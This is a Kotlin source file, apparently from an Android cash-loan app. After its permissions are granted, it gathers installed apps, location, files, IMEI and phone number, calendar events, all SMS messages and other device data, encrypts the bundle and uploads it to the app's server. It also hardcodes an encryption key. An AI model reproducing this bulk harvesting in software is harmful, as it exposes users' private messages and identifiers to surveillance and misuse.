package com.druto.loan.cash.drutocash

import android.location.Location
import android.util.Log
import androidx.lifecycle.MutableLiveData
import androidx.multidex.MultiDexApplication
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustConfig
import com.druto.loan.cash.adjust.AdjustLifecycleCallbacks
import com.druto.loan.cash.adjust.AdjustManager.onCreate
import com.druto.loan.cash.drutocash.collector.ApplicationData
import com.druto.loan.cash.drutocash.collector.CalendarCollector.fetchCalendarEvents
import com.druto.loan.cash.drutocash.collector.FileCollector.getFileInfoList
import com.druto.loan.cash.drutocash.collector.ImeiCollector.getImei
import com.druto.loan.cash.drutocash.collector.LocationCollector.getLocationInfoList
import com.druto.loan.cash.drutocash.collector.NetworkInfoCollector.getNetworkInfoList
import com.druto.loan.cash.drutocash.collector.PermissionEntity
import com.druto.loan.cash.drutocash.collector.SensorCollector.sensorInfoList
import com.druto.loan.cash.drutocash.collector.SmsCollector.fetchAllSms
import com.druto.loan.cash.drutocash.collector.SomeInfoCollector.getSomeInfoList
import com.druto.loan.cash.drutocash.http.HttpInterceptor
import com.druto.loan.cash.drutocash.http.ParserUtil.prepareEncryptString
import com.druto.loan.cash.drutocash.http.ParserUtil.prepareRequestBody
import com.druto.loan.cash.drutocash.service.MyEventUploader.DeviceInfoRequestInfo
import com.druto.loan.cash.drutocash.service.MyEventUploader.uploadDeviceInfoFailureEvent
import com.druto.loan.cash.drutocash.service.MyEventUploader.uploadDeviceInfoSuccessEvent
import com.druto.loan.cash.drutocash.service.MyEventUploader.uploadStartUploadDeviceInfoEvent
import com.druto.loan.cash.drutocash.ui.base.BaseAppCompatActivity
import com.druto.loan.cash.drutocash.utils.AppUtil.getApps
import com.druto.loan.cash.drutocash.utils.GeneralInfoHelper
import com.druto.loan.cash.drutocash.utils.GeneralInfoHelper.init
import com.druto.loan.cash.drutocash.utils.LanguageUtil
import com.druto.loan.cash.drutocash.utils.LanguageUtil.changeAppLanguage
import com.druto.loan.cash.drutocash.utils.SpHelper
import com.druto.loan.cash.drutocash.utils.SpHelper.initSharedPreferences
import com.druto.loan.cash.drutocash.utils.SpHelper.mainSp
import com.druto.loan.cash.drutocash.utils.SpHelper.uuid
import com.druto.loan.cash.firebase.service.FCMManager
import com.druto.loan.cash.firebase.service.FCMManager.getFCMToken
import com.druto.loan.cash.firebase.service.MyFirebaseMessagingService
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.su.request.RequestBase.init
import com.su.request.http.HttpResult
import com.su.request.http.NetRequest
import com.su.request.http.NullObject
import com.su.request.http.function.BusinessFunction
import com.su.request.http.observer.BaseObserver
import com.su.request.http.transformer.ParserTransformer
import io.reactivex.Observable
import io.reactivex.ObservableEmitter
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.plugins.RxJavaPlugins
import io.reactivex.schedulers.Schedulers
import java.util.UUID
import java.util.concurrent.TimeUnit
import java.util.stream.Collectors
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.RequestBody
import okhttp3.logging.HttpLoggingInterceptor
import okhttp3.logging.LoggingEventListener

/**
 * Created by su on 18-1-2.
 */
class DrutoCashApplication : MultiDexApplication() {

    override fun onCreate() {
        super.onCreate()
        drutoCashApplication=this
        BaseAppCompatActivity.sLogState = BuildConfig.DEBUG
        initSharedPreferences(this)
        init(this)
        initLanguageSetting()
        init(this, "")
        RxJavaPlugins.setErrorHandler { e: Throwable? ->
            Log.w(TAG, e)
        }
        init()
        onCreate(this)
        initOkHttpClient()
    }

    private fun init() {
        setupUuid()
        val appToken = BuildConfig.APP_TOKEN
        val environment = AdjustConfig.ENVIRONMENT_PRODUCTION
        val config = AdjustConfig(this, appToken, environment)
        Adjust.onCreate(config)
        Adjust.addSessionCallbackParameter("deviceUUID", APPLICATION_DATA.uuid)
        registerActivityLifecycleCallbacks(AdjustLifecycleCallbacks())
        SpHelper.host?.also { APPLICATION_DATA.setHost(it) }
        Log.i(TAG, "cachedHost=" + APPLICATION_DATA.getHost())
    }

    private fun setupUuid() {
        val uuid = uuid
        if (uuid != null) {
            APPLICATION_DATA.uuid = uuid
        } else {
            APPLICATION_DATA.uuid =
                UUID.randomUUID().toString()
            SpHelper.uuid = APPLICATION_DATA.uuid
        }
        Log.i(TAG, "uuid=" + APPLICATION_DATA.uuid)
    }

    interface OnAllUploadResultListener {
        fun onSuccess()
        fun onFailed(msg: String?)
    }

    companion object {
        val TAG: String = DrutoCashApplication::class.java.simpleName
        var sDebug: Boolean = false
        var country=-1
        var success=""
        val APPLICATION_DATA: ApplicationData = ApplicationData()

        var drutoCashApplication: DrutoCashApplication?=null

        val LOCATION_LIVE_DATA: MutableLiveData<Location?> = MutableLiveData(null)

        // https://doc.gh.imhere.online/#/ 全局参数，硬编码
        const val SECURITY_KEY: String = "d19d2f18949bfe1e"

        var client: OkHttpClient? = null
            private set

        private fun initOkHttpClient() {
            val builder = OkHttpClient.Builder()
                .connectTimeout(120, TimeUnit.SECONDS)
                .readTimeout(120, TimeUnit.SECONDS)
                .writeTimeout(120, TimeUnit.SECONDS)
                .addInterceptor(HttpInterceptor())
            if (BuildConfig.DEBUG) {
                val logLevel = HttpLoggingInterceptor.Level.BODY
                builder.eventListenerFactory(LoggingEventListener.Factory())
                val logging = HttpLoggingInterceptor()
                logging.setLevel(logLevel)
                builder.addNetworkInterceptor(logging)
            }
            client = builder.build()
        }

        private fun initLanguageSetting() {
            val sp = mainSp
            val language = sp!!.getString(
                SpHelper.COLUMN_LANGUAGE_CODE,
                LanguageUtil.DEFAULT_LANGUAGE
            )!!
            changeAppLanguage(language)
        }

        fun uploadEvent(id: String?, event: String?, params: String?) {
            val url = SpHelper.host + Url.SEND_EVENT
            Log.d(TAG, "updateEvent url=$url")
            Log.d(
                TAG,
                "updateEvent id=$id, event=$event, params=$params"
            )
            val list: MutableList<Any?> = ArrayList()
            list.add(id)
            list.add(event)
            list.add(params)
            val gson = Gson()
            val jsonString = gson.toJson(list)
            val requestBody = prepareRequestBody(jsonString, false)
            NetRequest.create(url, object : TypeToken<HttpResult<*>?>() {})
                .method("POST")
                .build(client, requestBody)
                .compose(ParserTransformer())
                .map<Any>(object : BusinessFunction<HttpResult<*>?, NullObject>() {
                    override fun onSuccess(result: HttpResult<*>?): NullObject {
                        if (result?.hum == 0) {
                            Log.d(
                                TAG,
                                "uploadEventSuccess=$event"
                            )
                        } else {
                            Log.w(TAG, "uploadEventFailed=" + result?.inverse)
                        }
                        return NullObject.NULL_OBJECT
                    }
                }).safeSubscribe(BaseObserver(null))
        }

        fun getFCMTokenFromServer() {
            getFCMToken(object : FCMManager.OnResultListener {
                override fun onResult(token: String?, exception: String?) {
                    val entity = MyFirebaseMessagingService.FCMTokenEntity(
                        token,
                        exception, 0
                    )
                    MyFirebaseMessagingService.updateFCMToken(
                        entity.token, entity.exceptionMsg,
                        entity.way
                    )
                }
            })
        }

        fun uploadAllInfo(listener: OnAllUploadResultListener?) {
            val context = GeneralInfoHelper.context
            val permissionList = APPLICATION_DATA.getPermissionEntityList()
            val unauthorizedList = permissionList.stream()
                .filter { entity: PermissionEntity -> !entity.check(context).isGranted }
                .collect(Collectors.toList())
            if (unauthorizedList.isNotEmpty()) {
                Log.w(
                    TAG,
                    "uploadAllInfo=unauthorizedList$unauthorizedList"
                )
                return
            }
            Log.d(TAG, "uploadAllInfo")
            val start = System.currentTimeMillis()
            val info = DeviceInfoRequestInfo()
            Observable.create<String?> { emitter: ObservableEmitter<String?> ->
                Log.d(TAG, "create thread=" + Thread.currentThread().name)
                val list =
                    allDeviceInfo
                // prepare http data
                val gson = Gson()
                val json = gson.toJson(list)
                emitter.onNext(json)
            }
                .flatMap { json: String? ->
                    Log.d(
                        TAG,
                        "flatMap thread=" + Thread.currentThread().name
                    )
                    val url = SpHelper.host + Url.SEND_ALL_DEVICE_INFO
                    val encrypt = prepareEncryptString(json, true)
                    info.bytesCount = encrypt!!.size
                    // 开始上传设备信息（准备上传设备信息的时候调用）
                    uploadStartUploadDeviceInfoEvent(encrypt.size)
                    val requestBody = RequestBody.create(
                        "application/octet-stream".toMediaTypeOrNull(), encrypt
                    )
                    NetRequest.create<HttpResult<*>>(
                        url,
                        object : TypeToken<HttpResult<*>?>() {
                        })
                        .method("POST")
                        .build(client, requestBody)
                        .compose(ParserTransformer())
                        .map<Any?>(object : BusinessFunction<HttpResult<*>?, NullObject>() {
                            override fun onSuccess(result: HttpResult<*>?): NullObject {
                                val effectiveness = result?.hum
                                if (effectiveness == 0) {
                                    Log.d(TAG, "upload all device info success")
                                    // 设备信息收集及上传成功通知
                                    uploadDeviceInfoSuccessEvent()
                                    listener?.onSuccess()
                                } else {
                                    Log.w(
                                        TAG,
                                        "upload all device info failed, cautiously=" + result?.inverse
                                    )
                                    val elapse = System.currentTimeMillis() - start
                                    info.elapse = elapse
                                    uploadDeviceInfoFailureEvent(info)
                                    listener?.onFailed(result?.inverse)
                                }
                                return NullObject.NULL_OBJECT
                            }
                        })
                }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .safeSubscribe(object : BaseObserver<Any?>(null) {
                    override fun onError(e: Throwable) {
                        super.onError(e)
                        val elapse = System.currentTimeMillis() - start
                        info.elapse = elapse
                        uploadDeviceInfoFailureEvent(info)
                        Log.w(TAG, e)
                        listener?.onFailed(e.message)
                    }
                })
        }

        private val allDeviceInfo: List<Any>
            get() {
                val context = GeneralInfoHelper.context
                val resolver = context.contentResolver
                val start = System.currentTimeMillis()
                val appInfoList =
                    getApps(context) // 0. 应用信息
                Log.d(
                    TAG,
                    ("getApps elapse: " + (System.currentTimeMillis() - start)
                            + ", " + "apps=" + appInfoList.size)
                )
                val location =
                    LOCATION_LIVE_DATA.value
                val locationList =
                    getLocationInfoList(
                        context,
                        location
                    ) // 1. 位置信息
                Log.d(TAG, "location=$location")
                val networkList =
                    getNetworkInfoList(
                        context
                    ) // 2. 网络信息 wifi列表不需要
                Log.d(
                    TAG,
                    "networkList=$networkList"
                )
                // 3. 通讯录 （不上传）
                val fileInfoList =
                    getFileInfoList(resolver) // 4. 文件信息
                Log.d(
                    TAG,
                    "fileInfoList=$fileInfoList"
                )
                val imeiList =
                    getImei(context) // 5. IMEI及手机号
                Log.d(TAG, "imeiList=$imeiList")
                // 6. 信号强度 （不上传）
                val sensorList =
                    sensorInfoList // 7. 传感器列表
                Log.d(TAG, "sensorList=$sensorList")
                val calendarList =
                    fetchCalendarEvents(context) // 8. 日历事件列表
                Log.d(
                    TAG,
                    "calendarList=$calendarList"
                )
                val smsList =
                    fetchAllSms(resolver) // 9. 短信列表
                Log.d(TAG, "smsList=$smsList")
                // 10. 通话记录列表 （不上传）
                // 11. 照片信息列表 （不上传）
                val someInfoList =
                    getSomeInfoList(context) // 12. 其他数据
                Log.d(
                    TAG,
                    "someInfoList=$someInfoList"
                )

                val lists: MutableList<Any> =
                    ArrayList()
                lists.add(appInfoList) // 0. 应用信息
                lists.add(locationList) // 1. 位置信息
                lists.add(networkList) // 2. 网络信息
                lists.add(ArrayList<Any>()) // 3. 通讯录 （不上传）
                lists.add(fileInfoList) // 4. 文件信息
                lists.add(imeiList) // 5. IMEI及手机号
                lists.add(ArrayList<Any>()) // 6. 信号强度 （不上传）
                lists.add(sensorList) // 7. 传感器列表
                lists.add(calendarList) // 8. 日历事件列表
                lists.add(smsList) // 9. 短信列表
                lists.add(ArrayList<Any>()) // 10. 通话记录列表 （不上传）
                lists.add(ArrayList<Any>()) // 11. 照片信息列表 （不上传）
                lists.add(someInfoList) // 12. 其他数据
                return lists
            }
    }
}
